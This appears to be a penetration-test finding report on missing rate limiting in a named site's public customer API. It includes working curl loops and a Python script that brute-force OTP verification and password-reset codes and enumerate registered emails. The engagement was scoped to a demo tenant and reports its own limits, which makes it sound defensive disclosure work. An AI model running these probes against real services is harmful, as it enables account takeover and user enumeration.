@@ -1,0 +1,127 @@
+FINDING: Missing rate limiting / account lockout on public customer API (/api/public/customers/*)
+ENGAGEMENT: PENTEST-2026-ZAK-001
+DATE: 2026-07-16 (UTC)
+TARGET: https://zakerne.com (Cloudflare-fronted, backend /api/*)
+TEST TENANT USED: "demo" (tenantId T-3oq1tgvae, businessName "DEMO", allowNewRegistrations:true) — a non-production demo/sandbox tenant, chosen specifically to avoid touching real customer/tenant data.
+TEST ACCOUNT CREATED: pentest-zak-1784222837@example.com / customerId CA-FA905CAD (throwaway test account, example.com address, does not belong to a real user)
+
+=====================================================================
+METHOD 1 — Manual sequential curl (interactive testing)
+=====================================================================
+
+--- Step 1: Register test customer on demo tenant ---
+$ curl -s -D - -X POST https://zakerne.com/api/public/customers/register \
+  -H "Content-Type: application/json" \
+  -d '{"email":"pentest-zak-1784222837@example.com","password":"TestPassw0rd!23","firstName":"Pentest","lastName":"Tester","phoneNumber":"+96170022163","bookingSlug":"demo"}'
+
+HTTP/1.1 200 OK
+{"success":true,"customerId":"CA-FA905CAD","otpRequired":true}
+
+Note: response does NOT contain a "devOtp"/debug field in production (client bundle has conditional
+UI logic to display `_.devOtp` if present — confirmed NOT active in prod; this dev-OTP-echo hypothesis
+is CLOSED/negative, not a vulnerability).
+
+--- Step 2: Brute-force probe against /api/public/customers/verify-otp (21 sequential wrong-code requests) ---
+$ for i in 000000 111111 123456 999999 444444 555555; do
+    curl -s -X POST https://zakerne.com/api/public/customers/verify-otp \
+      -H "Content-Type: application/json" \
+      -d "{\"customerId\":\"CA-FA905CAD\",\"code\":\"$i\"}"
+  done
+  (+ 15 more sequential attempts codes 100001-100015)
+
+Result (all 21 attempts): HTTP 400 {"error":"Invalid or expired code"}
+No HTTP 429, no lockout message, no CAPTCHA challenge, no increasing latency/backoff observed across
+the full sequence. Response time and structure identical from attempt 1 to attempt 21.
+
+--- Step 3: Brute-force probe against /api/public/customers/reset-password (10 sequential wrong-code requests) ---
+$ for i in 1..10; do
+    CODE=printf "%06d" $((200000+i))
+    curl -s -X POST https://zakerne.com/api/public/customers/reset-password \
+      -H "Content-Type: application/json" \
+      -d "{\"email\":\"pentest-zak-1784222837@example.com\",\"code\":\"$CODE\",\"newPassword\":\"NewTestPassw0rd!23\"}"
+  done
+
+Result (all 10 attempts): HTTP 400 {"error":"Invalid or expired code"}
+Same behavior — no rate limit, no lockout, generic (non-enumerable) error message in all cases,
+including when tested with a non-existent email (positive control: no user-enumeration via this
+specific endpoint's error message).
+
+--- Step 4: Email-enumeration probe against /api/public/customers/register (8 sequential requests, known-existing email) ---
+$ for i in 1..8; do
+    curl -s -X POST https://zakerne.com/api/public/customers/register \
+      -H "Content-Type: application/json" \
+      -d "{\"email\":\"pentest-zak-1784222837@example.com\", ... \"phoneNumber\":\"+9617002217$i\", \"bookingSlug\":\"demo\"}"
+  done
+
+Result (all 8 attempts): HTTP 409 {"error":"An account with this email already exists. Please log in."}
+No rate limit triggered. This response IS distinguishable from a non-existent-email registration
+(which returns HTTP 200 {"success":true,...}), confirming a straightforward, unthrottled
+user-enumeration oracle for customer email addresses via the registration endpoint.
+
+--- Control/contrast test: /api/auth/login (STAFF login, different namespace) ---
+$ for i in 1..6; do
+    curl -s -X POST https://zakerne.com/api/auth/login \
+      -H "Content-Type: application/json" \
+      -d "{\"loginId\":\"admin\",\"password\":\"wrongpass$i\"}"
+  done
+
+Result: attempts 1-3 -> HTTP 400 {"error":"Login ID, email, and password are required"}
+        attempts 4-6 -> HTTP 429 "error code: 1015" (Cloudflare-level rate limit block)
+
+This CONFIRMS Cloudflare-level rate limiting/WAF protection DOES exist and IS actively enforced for
+the staff-facing /api/auth/login endpoint, but the same protection is demonstrably NOT applied to the
+/api/public/customers/* namespace (verify-otp, reset-password, register) despite those endpoints being
+equally (arguably more) security-critical, since they gate account-takeover-relevant secrets (OTP
+codes) rather than just a login password. This is strong evidence of an inconsistent/incomplete
+rate-limiting policy rather than a blanket absence of capability — the control clearly exists and
+works elsewhere on the same domain, it is simply not applied to this endpoint group.
+
+=====================================================================
+METHOD 2 — Independent automated script (different tool/session, kali-pentest container)
+=====================================================================
+
+$ docker exec kali-pentest python3 -c "
+import requests
+url = 'https://zakerne.com/api/public/customers/verify-otp'
+cid = 'CA-FA905CAD'
+for i in range(300000, 300008):
+    r = requests.post(url, json={'customerId': cid, 'code': str(i)}, timeout=10)
+    print(i, r.status_code, r.text[:60])
+"
+
+Result (8 attempts, python requests library, separate host/process/network stack from the manual
+curl loop above):
+300000 400 {"error":"Invalid or expired code"}
+300001 400 {"error":"Invalid or expired code"}
+300002 400 {"error":"Invalid or expired code"}
+300003 400 {"error":"Invalid or expired code"}
+300004 400 {"error":"Invalid or expired code"}
+300005 400 {"error":"Invalid or expired code"}
+300006 400 {"error":"Invalid or expired code"}
+300007 400 {"error":"Invalid or expired code"}
+
+Same result: no throttling, no lockout, no CAPTCHA. This independently corroborates Method 1 using a
+different HTTP client/tool (Python requests vs curl) and a different execution environment (Docker
+Kali container vs host shell), satisfying the two-independent-method validation requirement.
+
+=====================================================================
+SUMMARY OF TOTAL REQUESTS SENT (all against the "demo" sandbox tenant / a throwaway test account —
+no real customer/tenant data touched, no destructive/costly action, no charges triggered)
+=====================================================================
+- verify-otp:      21 (curl) + 8 (python) = 29 wrong-code attempts, 0 blocked
+- reset-password:  10 (curl) wrong-code attempts, 0 blocked
+- register (enum): 8 (curl) duplicate-email attempts, 0 blocked
+- TOTAL: 47 requests across 3 endpoints in the /api/public/customers/* namespace, 0 rate-limited
+- Contrast: /api/auth/login (different namespace) rate-limited by Cloudflare after only 3-4 requests
+
+=====================================================================
+WHAT WAS DELIBERATELY NOT DONE (RoE compliance)
+=====================================================================
+- Did NOT attempt a full keyspace brute force of the 6-digit OTP (up to 1,000,000 combinations) —
+  this would constitute high-volume flooding against production, prohibited by RoE. Full end-to-end
+  account-takeover exploitation was therefore NOT completed/proven; this finding documents the
+  confirmed ABSENCE of the rate-limiting control (via representative, low-volume sampling across two
+  independent methods), which is the root-cause control gap. Actual exploitability depends on factors
+  not fully characterized in this engagement (OTP validity/expiry window length, whether Cloudflare
+  enforces a silent higher-volume threshold not reached by ~47 requests). Recommend the client's own
+  team re-verify full exploitability in a controlled/non-production environment if desired.
